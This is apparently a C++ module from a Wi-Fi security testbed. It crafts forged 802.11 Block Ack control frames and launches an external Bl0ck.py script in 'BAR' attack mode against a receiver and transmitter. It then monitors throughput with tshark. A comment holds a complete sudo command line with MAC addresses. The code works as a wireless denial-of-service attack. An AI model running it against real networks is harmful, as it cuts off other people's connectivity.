#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "attacks/DoS_soft/bl0ck/test_monitor_bl0ck/test_monitor_bl0ck.h"
#include "config/RunStatus.h"
#include "logger/log.h"
#include "system/iface.h"
#include <chrono>
#include <thread>
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::test_monitor_bl0ck{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;
    using namespace chrono;

    RadioTap get_bl0ck_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw, const int subtype) {
        Dot11 frame;
        frame.type(Dot11::CONTROL);
        frame.subtype(subtype);
        frame.addr1(ap_hw); // Receiver Address (RA)

        const vector addr2_bytes(sta_hw.begin(), sta_hw.end());

        const vector<uint8_t> payload_data = {
            0x04, 0x00, 0x74, 0x49, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
        };
        // TODO v python script je prázdná hlavička, je nutné ji mít prázdnou
        // RadioTap() <- dá tam něco defaultně
        const RadioTap rt{};
        return  rt / frame / RawPDU(addr2_bytes) / RawPDU(payload_data);
    }

    void speed_observation_start(RunStatus &rs){
        observer::start_thark(rs, "receiver", "(link[0] == 0x88 or link[0] == 0x84)");
        observer::start_thark(rs, "transceiver", "(link[0] == 0x88 or link[0] == 0x84)");
    }

    void setup_attack(RunStatus& rs){

    }

    void run_attack(RunStatus& rs){
        const NetworkInterface iface_obj(rs.get_actor("transceiver")["iface"]);

        const HWAddress<6> rx_mac(rs.get_actor("receiver")["mac"]);
        const HWAddress<6> tx_mac(rs.get_actor("transceiver")["mac"]);
        speed_observation_start(rs);

        /*PacketSender sender;


        this_thread::sleep_for(seconds(5));
        RadioTap block_frame = get_bl0ck_frame(
            HWAddress<6>(iface::rand_mac()),
            HWAddress<6>(iface::rand_mac()), 8);
        for (int i = 0; i < 50; ++i) {sender.send(block_frame, iface_obj);}
        this_thread::sleep_for(seconds(5));
        */

        const vector<string> command = {
            "sudo",
            "python3",
            "/home/kali/PycharmProjects/Bl0ck/Bl0ck.py",
            "--sta", rx_mac.to_string(),
            "--ap", tx_mac.to_string(),
            "--wnic", rs.get_actor("transceiver")["iface"],
            "--attack","BAR",
            "--verbose", "1",
            "--num", "50",
            "--frames","0",
            "--rand", "0"
        };
        rs.process_manager.run("transceiver", command);
        //sudo python3 /home/kali/PycharmProjects/Bl0ck/Bl0ck.py --sta 28:87:ba:a3:cf:16 --ap 00:c0:ca:b5:e1:58 --wnic wlan3 --attack BAR --verbose 1 --num 50 --frames 0 --rand 0
        this_thread::sleep_for(seconds(30));
    }

    void stats_attack(const RunStatus& rs){
        vector<observer::graph_lines> events;
        observer::tshark_graph(rs, "receiver", events);
    }
}
